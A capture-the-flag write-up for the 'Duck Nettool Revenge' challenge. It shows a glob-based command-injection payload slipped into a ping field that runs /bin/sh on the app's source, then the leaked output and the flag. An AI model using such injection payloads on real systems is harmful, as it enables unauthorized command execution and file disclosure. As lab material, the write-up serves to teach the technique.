# Duck Nettool Revenge

## Description

Solve on local first because on remote have captcha On remote it will replace all `v1t{fake_flag}` with real flag

Flag on the source code, sorry for the earlier chall was unintended :<

https://api.v1t.site

## Solution Walkthrough

This challenge is about globbing. At first, I thought `flag.py` would be modified to print the actual flag, but it wasn't. Attempting to read `flag.txt` was also useless.

Later, I realized I could use `/bin/sh` to execute `app.py` directly, which would then print the contents of the file.

```text
0; /?i?/?? /???/???.??
```

```txt
PING 0 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.094 ms

--- 0 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.094/0.094/0.094/0.000 ms
/app/app.py: 12: 
TODO / Deployment fixes

- The challenge is currently not solvable because:
  - flag.txt has incorrect permissions.
  - flag.py should print(FLAG) not 'FLAG'.

- Fix the deployment files before expecting a valid solve path.

- The SHA-256 hash of v1t{br0_th15_15_duck} is not realistically brute-forceable,
  so the init Bash script also needs to be fixed.
: not found
/app/app.py: 13: import: not found
/app/app.py: 14: import: not found
/app/app.py: 15: import: not found
/app/app.py: 16: import: not found
/app/app.py: 17: import: not found
/app/app.py: 18: import: not found
/app/app.py: 19: from: not found
/app/app.py: 21: Syntax error: "(" unexpected
```

## Flag

```text
v1t{br0_th15_15_duck}
```
